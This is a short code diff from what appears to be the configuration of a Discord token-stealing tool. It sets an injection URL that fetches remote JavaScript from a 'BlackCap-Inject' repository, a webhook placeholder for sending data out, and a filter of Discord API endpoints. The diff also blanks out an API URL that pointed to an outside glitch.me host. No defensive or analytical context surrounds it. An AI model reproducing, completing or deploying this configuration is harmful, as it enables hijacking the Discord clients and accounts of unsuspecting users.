@@ -29,7 +29,7 @@ const config = {
 
     injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     webhook: "%WEBHOOK%",
-    apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
+    apiurl: "",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
